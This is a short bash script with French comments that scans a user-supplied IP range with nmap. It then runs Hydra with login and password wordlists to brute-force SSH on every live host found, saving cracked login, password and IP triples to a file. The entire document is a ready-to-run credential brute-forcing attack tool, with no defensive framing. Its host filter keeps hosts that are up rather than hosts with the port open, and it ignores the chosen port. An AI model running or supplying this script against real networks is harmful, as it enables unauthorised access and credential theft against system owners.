#!/bin/bash

# Demander à l'utilisateur la plage d'adresses IP à scanner
echo "Entrez la plage d'adresses IP à scanner (ex: 192.168.1.0/24):"
read IP_RANGE

# Demander à l'utilisateur le port à scanner
echo "Entrez le port à scanner (ex: 22 pour SSH):"
read PORT

# Fichier pour stocker les adresses IP uniques
IP_FILE="ips.log"
# Fichier pour stocker les résultats de Hydra
HYDRA_RESULTS="hydra_results.log"
# Fichier final pour stocker les couples login, mot de passe et IP
FINAL_RESULTS="final_results.txt"

# Utiliser nmap pour scanner la plage d'IP sur le port spécifié
echo "Démarrage de nmap sur le port $PORT..."
nmap -p "$PORT" "$IP_RANGE" -oG - | awk '/Up$/{print $2}' > "$IP_FILE"

# Vérifie si le fichier contenant les IP n'est pas vide
if [ -s "$IP_FILE" ]; then
    echo "Fichier d'IP rempli, démarrage de Hydra..."
    # Lancer Hydra sur les adresses IP capturées avec les fichiers login et mot de passe et stocker les résultats
    hydra -L login.txt -P psswd.txt -M "$IP_FILE" ssh > "$HYDRA_RESULTS"

    # Analyser les résultats de Hydra et extraire les couples réussis
    grep 'login:' "$HYDRA_RESULTS" | awk '{print $3, $5, $7}' > "$FINAL_RESULTS"
    echo "Les résultats ont été stockés dans $FINAL_RESULTS"
else
    echo "Aucune adresse IP active trouvée sur le port $PORT."
fi

# Nettoyer le fichier temporaire
rm "$HYDRA_RESULTS"
